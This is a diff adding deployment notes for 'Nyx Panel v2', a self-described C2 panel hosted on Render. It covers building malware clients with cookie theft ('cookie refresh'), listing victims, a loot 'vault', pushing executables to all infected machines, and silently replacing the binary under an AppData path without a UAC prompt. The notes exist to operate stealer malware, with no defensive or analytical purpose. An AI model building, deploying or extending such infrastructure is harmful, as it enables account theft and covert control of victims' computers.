@@ -1,0 +1,23 @@
+Nyx Panel v2 — Render deploy
+
+1. Create new Web Service on Render from this folder (or push to github and connect).
+2. Build: pip install -r requirements.txt
+3. Start: python app.py
+4. Env: SECRET_KEY=any-long-random
+5. C2 / panel URL stays https://nyxpanel.onrender.com
+
+Builder (local):
+  Python 3.12 only
+  cd builder
+  py -3.12 local_builder.py
+  Template is 3.2.0 with cookie refresh + limiteds + safer self_update
+
+New routes:
+  /                overview
+  /v/<vid>         victim
+  /vault           vault
+  /updates         drag-drop exe auto-update all clients
+  /builder         builder notes
+  /settings        settings
+
+Self-update is silent in-place replace under AppData Themes path (no UAC).
